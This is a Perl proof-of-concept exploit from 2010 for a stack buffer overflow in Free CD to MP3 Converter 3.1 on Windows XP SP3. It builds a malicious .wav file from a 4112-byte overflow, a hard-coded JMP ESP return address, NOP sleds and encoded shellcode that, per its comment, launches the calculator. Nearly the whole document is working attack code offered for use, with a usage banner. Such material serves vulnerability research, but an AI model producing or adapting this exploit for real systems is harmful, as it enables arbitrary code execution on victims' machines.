#!usr/bin/perl
#Exploit Title: Exploit 0day Buffer Overflow Free CD to MP3 Converter 3.1
#Date: 09\11\2010
#Author: C4SS!0 G0M3S
#Software Link: http://www.eusing.com/Download/cdtomp3freeware.exe
#Version: 3.1
#Tested on: WIN-XP SP3
#
#
#Exploit Writted by C4SS!0 G0M3S
#
#
#Home: http://www.invasao.com.br
#
#
#E-mail: louredo_@hotmail.com
#
#

use IO::File;#import IO:File

system("cls");
system("color 4f");

sub usage
{
sub image
{
print("\n\n");
print("             ______________\n");
print("             <C4SS!0 G0MES>\n".
 "             --------------\n".
 "                   \\   \,__\,\n".
 "                    \\-- (oo)____\n".
 "                        (__)    )\\\n".
 "                           ||--|| \n\n\n\n");
 }
 image;
 
print("          [+]Exploit: Buffer Overflow Free CD to MP3 Converter\n\n".
      "          [+]Author: C4SS!0 G0M3S\n\n".
	  "          [+]Home: http://www.invasao.com.br\n\n".
	  "          [+]E-mail: Louredo_\@hotmail.com\n\n\n".
	  "          [+]Usage: exploit.pl <File to create>\n". 
	  "          [+]Exemple: exploit.pl music.wav\n");
 }
 
 if($#ARGV != 0)
 {
 usage;
}
else
{
image;

$buffer="\x41" x 4112;
$eip=pack('V',0x004D97BB);#Jmp Esp From(cdextact.exe)
#Exec the Calc
$shellcode="\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" .
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" .
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" .
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" .
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" .
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" .
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
"\x7f\xe8\x7b\xca";
$nops="\x90" x 50;

print("          [+]Writing in the Shellcode @ARGV[0] File\n\n".
      "          [+]Identifying the Length of the Shellcode\n\n".
	"	  [+]Length of the Shellcode:".length($shellcode)."\n\n".
      "          [+]File @ARGV[0] Created Successfully\n\n");
	
	open(f,">@ARGV[0]");
	print f $buffer.$eip.$nops.$shellcode.$nops;
	close();
    




}